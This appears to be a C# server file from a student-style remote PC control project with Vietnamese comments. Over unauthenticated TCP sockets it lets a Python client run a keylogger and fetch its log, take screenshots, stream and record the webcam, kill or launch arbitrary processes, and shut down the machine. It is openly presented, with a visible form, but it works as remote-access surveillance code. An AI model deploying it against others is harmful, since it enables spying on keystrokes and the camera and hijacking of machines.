using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using Microsoft.Win32;
using System.IO;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Threading;
using KeyLogger;
using AForge.Video;
using AForge.Video.DirectShow;
using Accord.Video.FFMPEG; // Thư viện quay phim bạn vừa tải
using System.Runtime.ExceptionServices; // Bắt buộc có dòng này
using System.Security;
namespace ServerApp
{
    public partial class server : Form
    {
        Thread serverThread; // Luồng chính để chạy Server lắng nghe
        Thread tklog = null; // Luồng riêng cho Keylogger để không chặn UI
        // --- KHAI BÁO BIẾN WEBCAM (THÊM MỚI) ---
        Thread videoServerThread; // Luồng chạy server video (Port 5657)
        VideoCaptureDevice videoSource; // Thiết bị Webcam
        VideoFileWriter writer;   // Biến ghi hình của Accord
        bool isStreaming = false;
        bool isRecording = false;
        Socket videoClient;       // Socket gửi ảnh
        string currentVideoFile = "";
        // ---------------------------------------
        public server()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false; // Cho phép truy cập UI từ luồng khác (dùng cẩn thận)
            this.FormClosing += new FormClosingEventHandler(server_FormClosing);

            // Xóa file log cũ khi khởi động lại server để tránh file bị phình to
            try
            {
                if (File.Exists(KeyLogger.appstart.path))
                    File.Delete(KeyLogger.appstart.path);
            }
            catch { }
        }

        // Đảm bảo ngắt toàn bộ tiến trình khi đóng Form
        private void server_FormClosing(object sender, FormClosingEventArgs e)
        {
            StopWebcam();
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }

        // Sự kiện nút "Open Server"
        private void button1_Click(object sender, EventArgs e)
        {
            ((Button)sender).Enabled = false;
            ((Button)sender).Text = "Running...";

            // Chạy server trên một luồng nền (Background Thread)
            serverThread = new Thread(StartServerLoop);
            serverThread.IsBackground = true;
            serverThread.Start();
            // --- THÊM MỚI: Chạy Server Video ở Port 5657 ---
            videoServerThread = new Thread(StartVideoServer);
            videoServerThread.IsBackground = true;
            videoServerThread.Start();
        }

        // Vòng lặp chính: Lắng nghe kết nối TCP tại Port 5656
        private void StartServerLoop()
        {
            try
            {
                IPEndPoint ip = new IPEndPoint(IPAddress.Any, 5656);
                Program.server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                Program.server.Bind(ip);
                Program.server.Listen(100); // Hàng đợi tối đa 100 kết nối

                while (true)
                {
                    try
                    {
                        // Chấp nhận kết nối từ Client (Python Web Server)
                        Program.client = Program.server.Accept();
                        Program.ns = new NetworkStream(Program.client);
                        Program.nr = new StreamReader(Program.ns);
                        Program.nw = new StreamWriter(Program.ns);
                        Program.nw.AutoFlush = true; // Tự động đẩy dữ liệu đi không cần buffer

                        // Chuyển sang xử lý lệnh
                        HandleClientCommunication();

                    }
                    catch { }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Port 5656 Error: " + ex.Message);
                Environment.Exit(0);
            }
        }

        // Phân tích cú pháp lệnh gửi từ Client
        // File: server.cs - Cập nhật hàm HandleClientCommunication

        private void HandleClientCommunication()
        {
            String s = "";
            while (true)
            {
                receiveSignal(ref s); // Đọc 1 dòng từ Python

                // Python gửi gì, C# bắt cái đó chính xác 1-1
                switch (s)
                {

                    case "KEYLOG": keylog(); break;
                    case "PROCESS": process(); break;
                    case "APPLICATION": application(); break;
                    case "TAKEPIC": takepic(); break;
                    case "SHUTDOWN": System.Diagnostics.Process.Start("ShutDown", "-s"); break;
                    case "RESTART": System.Diagnostics.Process.Start("shutdown", "/r /t 0"); break;

                    // --- NHÓM LỆNH WEBCAM (MỞ RỘNG DỄ DÀNG) ---
                    // Nếu sau này bạn muốn thêm tính năng "ZOOM", chỉ cần thêm case "WEBCAM_ZOOM"

                    case "WEBCAM_START":
                        isStreaming = true;
                        StartWebcam();
                        Program.nw.WriteLine("Webcam Started"); // Phản hồi cho Python
                        Program.nw.Flush();
                        break;

                    case "WEBCAM_STOP":
                        isStreaming = false;
                        isRecording = false;
                        StopWebcam();
                        Program.nw.WriteLine("Webcam Stopped"); // Phản hồi
                        Program.nw.Flush();
                        break;

                    case "WEBCAM_RECORD_ON":
                        StartRecording();
                        Program.nw.WriteLine("Recording Started"); // Phản hồi
                        Program.nw.Flush();
                        break;

                    case "WEBCAM_RECORD_OFF":
                        isRecording = false;
                        if (writer != null && writer.IsOpen) writer.Close();
                        Program.nw.WriteLine("Recording Saved"); // Phản hồi
                        Program.nw.Flush();
                        break;

                    // --- THOÁT ---
                    case "QUIT": return;

                    // Default để tránh treo nếu nhận lệnh rác
                    default: break;
                }
            }
        }

        // Hàm tiện ích để đọc dòng lệnh an toàn
        public void receiveSignal(ref String s)
        {
            try { s = Program.nr.ReadLine(); if (s == null) s = "QUIT"; }
            catch { s = "QUIT"; }
        }

        // --- MODULE KEYLOGGER ---
        public void keylog()
        {
            KeyLogger.appstart.path = Application.StartupPath + @"\keylog_cache.txt";
            String s = "";

            while (true)
            {
                receiveSignal(ref s);
                switch (s)
                {
                    case "HOOK": // Bắt đầu ghi phím
                        if (tklog == null || !tklog.IsAlive)
                        {
                            tklog = new Thread(new ThreadStart(KeyLogger.InterceptKeys.startKLog));
                            tklog.SetApartmentState(ApartmentState.STA);
                            tklog.Start();
                        }
                        break;

                    case "UNHOOK": // Dừng ghi phím
                        if (tklog != null && tklog.IsAlive)
                        {
                            try { tklog.Abort(); } catch { }
                            tklog = null;
                        }
                        break;

                    case "STATUS": // Kiểm tra trạng thái để hiển thị lên Web
                        bool isRunning = (tklog != null && tklog.IsAlive);
                        Program.nw.WriteLine(isRunning ? "RUNNING" : "STOPPED");
                        Program.nw.Flush();
                        break;

                    case "CLEAR": // Xóa file log
                        try { File.WriteAllText(KeyLogger.appstart.path, ""); } catch { }
                        Program.nw.WriteLine("Logs Cleared");
                        Program.nw.Flush();
                        break;

                    case "PRINT": // Đọc file log gửi về Client
                        String log = "";
                        if (File.Exists(KeyLogger.appstart.path))
                        {
                            try
                            {
                                using (FileStream fs = new FileStream(KeyLogger.appstart.path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                using (StreamReader sr = new StreamReader(fs))
                                {
                                    log = sr.ReadToEnd();
                                }
                            }
                            catch { log = "Reading..."; }
                        }
                        if (string.IsNullOrEmpty(log)) log = " ";
                        Program.nw.WriteLine(log);
                        Program.nw.Flush();
                        break;

                    case "QUIT": return;
                }
            }
        }

        // --- MODULE SCREENSHOT ---
        public void takepic()
        {
            String ss = "";
            while (true)
            {
                receiveSignal(ref ss);
                if (ss == "QUIT") return;
                if (ss == "TAKE")
                {
                    try
                    {
                        // Chụp toàn màn hình
                        Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                        Graphics g = Graphics.FromImage(bmp);
                        g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);

                        // Lưu vào MemoryStream để chuyển thành mảng byte
                        MemoryStream ms = new MemoryStream();
                        bmp.Save(ms, ImageFormat.Bmp);
                        byte[] b = ms.ToArray();

                        // Gửi kích thước ảnh trước, sau đó gửi dữ liệu ảnh
                        Program.nw.WriteLine(b.Length.ToString()); Program.nw.Flush();
                        Program.client.Send(b);
                    }
                    catch { Program.nw.WriteLine("0"); Program.nw.Flush(); }
                }
            }
        }

        // --- MODULE PROCESS & APPLICATION ---
        // Sử dụng chung logic ProcessHandler để giảm lặp code
        public void application() { ProcessHandler("App"); }
        public void process() { ProcessHandler("All"); }

        private void ProcessHandler(string mode)
        {
            String ss = "";
            while (true)
            {
                receiveSignal(ref ss);
                if (ss == "QUIT") return;

                if (ss == "XEM") // Lấy danh sách
                {
                    Process[] pr = Process.GetProcesses();
                    List<Process> filteredList = new List<Process>();
                    foreach (Process p in pr)
                    {
                        // Nếu mode là App thì chỉ lấy cửa sổ có tiêu đề
                        if (mode == "All" || p.MainWindowTitle.Length > 0) filteredList.Add(p);
                    }

                    // Sắp xếp danh sách
                    if (mode == "App") filteredList = filteredList.OrderBy(p => p.MainWindowTitle).ToList();
                    else filteredList = filteredList.OrderBy(p => p.ProcessName).ToList();

                    // Gửi số lượng trước
                    Program.nw.WriteLine(filteredList.Count.ToString()); Program.nw.Flush();

                    // Gửi chi tiết từng Process
                    foreach (Process p in filteredList)
                    {
                        if (mode == "App") Program.nw.WriteLine(p.MainWindowTitle);
                        else Program.nw.WriteLine(p.ProcessName);
                        Program.nw.Flush();
                        Program.nw.WriteLine(p.Id.ToString()); Program.nw.Flush();
                        Program.nw.WriteLine(p.Threads.Count.ToString()); Program.nw.Flush();
                    }
                }
                else if (ss == "KILL") // Diệt tiến trình
                {
                    receiveSignal(ref ss);
                    if (ss == "KILLID")
                    {
                        string id = Program.nr.ReadLine();
                        try
                        {
                            Process p = Process.GetProcessById(int.Parse(id));
                            string pName = (mode == "App") ? p.MainWindowTitle : p.ProcessName;
                            p.Kill();
                            Program.nw.WriteLine($"Successfully killed: {pName} (ID: {id})");
                        }
                        catch (Exception ex) { Program.nw.WriteLine("Failed: " + ex.Message.Replace("\n", " ")); }
                        Program.nw.Flush();
                    }
                }
                else if (ss == "START") // Mở tiến trình mới
                {
                    receiveSignal(ref ss);
                    if (ss == "STARTID")
                    {
                        string name = Program.nr.ReadLine();
                        try
                        {
                            Process.Start(name);
                            Program.nw.WriteLine("Successfully started: " + name);
                        }
                        catch (Exception ex) { Program.nw.WriteLine("Failed: " + ex.Message.Replace("\n", " ")); }
                        Program.nw.Flush();
                    }
                }
            }
        }
        // ==========================================================
        // KHU VỰC HÀM XỬ LÝ WEBCAM & RECORDING (THÊM MỚI TOÀN BỘ)
        // ==========================================================

        // 1. Hàm khởi tạo Server Video tại Port 5657
        private void StartVideoServer()
        {
            try
            {
                IPEndPoint ip = new IPEndPoint(IPAddress.Any, 5657);
                Socket vServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                vServer.Bind(ip);
                vServer.Listen(10);
                while (true)
                {
                    videoClient = vServer.Accept();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Lỗi Port 5657: " + ex.Message);
            }
        }

        // 2. Bật Webcam
        [HandleProcessCorruptedStateExceptions]
        [SecurityCritical]
        void StartWebcam()
        {
            try
            {
                FilterInfoCollection videos = new FilterInfoCollection(FilterCategory.VideoInputDevice);

                if (videos.Count == 0)
                {
                    MessageBox.Show("Lỗi: Không tìm thấy Webcam nào!");
                    return;
                }

                // Lấy Camera đầu tiên
                // Nếu gặp OBS Camera lỗi, thuộc tính bên trên sẽ chặn việc sập nguồn
                videoSource = new VideoCaptureDevice(videos[0].MonikerString);
                videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
                videoSource.Start();
            }
            catch (Exception ex)
            {
                // Bây giờ nó sẽ hiện lỗi ra đây thay vì tắt bụp chương trình
                MessageBox.Show("Đã bỏ qua lỗi Driver Camera: " + ex.Message);
            }
        }

        // 3. Tắt Webcam và đóng file ghi hình
        void StopWebcam()
        {
            if (videoSource != null && videoSource.IsRunning)
            {
                videoSource.SignalToStop();
                videoSource = null;
            }
            if (writer != null && writer.IsOpen)
            {
                writer.Close();
                writer.Dispose();
            }
        }

        // 4. Bắt đầu Ghi hình (Dùng Accord)
        void StartRecording()
        {
            try
            {
                // 1. Tạo tên file mới dựa trên giờ hiện tại
                currentVideoFile = "Record_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".avi";

                // 2. Đảm bảo writer cũ đã đóng trước khi bắt đầu cái mới
                if (writer != null)
                {
                    writer.Dispose();
                    writer = null;
                }

                // 3. Chỉ bật cờ hiệu, chưa mở file ngay (để dành việc mở file cho hàm video_NewFrame)
                isRecording = true;
            }
            catch (Exception ex)
            {
                MessageBox.Show("Lỗi bật ghi hình: " + ex.Message);
            }
        }

        // 5. Sự kiện xử lý từng khung hình (Quan trọng)
        private void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            try
            {
                // Clone ảnh từ Camera ra để xử lý
                Bitmap image = (Bitmap)eventArgs.Frame.Clone();

                // --- PHẦN 1: XỬ LÝ GHI HÌNH (RECORD) ---
                if (isRecording)
                {
                    // Kiểm tra: Nếu file chưa mở thì mở ngay bây giờ
                    // Lúc này ta dùng chính kích thước của 'image' để mở file
                    if (writer == null)
                    {
                        writer = new VideoFileWriter();

                        // QUAN TRỌNG: image.Width và image.Height là kích thước thật của Camera
                        // Bitrate 2000000 (2Mbps) giúp video nét hơn
                        writer.Open(currentVideoFile, image.Width, image.Height, 25, VideoCodec.MPEG4, 2000000);
                    }

                    // Nếu file đang mở thì ghi hình vào
                    if (writer.IsOpen)
                    {
                        writer.WriteVideoFrame(image);
                    }
                }

                // --- PHẦN 2: XỬ LÝ TRUYỀN HÌNH (STREAMING) ---
                // (Đoạn này giữ nguyên logic cũ để truyền qua mạng)
                if (isStreaming && videoClient != null && videoClient.Connected)
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        // Nén ảnh JPEG chất lượng 50%
                        EncoderParameters myEncoderParameters = new EncoderParameters(1);
                        myEncoderParameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 50L);

                        image.Save(ms, GetEncoderInfo("image/jpeg"), myEncoderParameters);

                        byte[] buffer = ms.ToArray();
                        byte[] sizeInfo = Encoding.ASCII.GetBytes(buffer.Length.ToString() + "\n");

                        // Gửi kích thước -> Gửi ảnh
                        videoClient.Send(sizeInfo);
                        videoClient.Send(buffer);
                    }
                }

                // Giải phóng bộ nhớ ảnh
                image.Dispose();
            }
            catch
            {
                // Bỏ qua lỗi nếu bị drop frame để tránh crash
            }
        }

        // 6. Hàm phụ trợ nén ảnh
        private static ImageCodecInfo GetEncoderInfo(String mimeType)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
            foreach (ImageCodecInfo codec in codecs)
                if (codec.MimeType == mimeType) return codec;
            return null;
        }
    }
}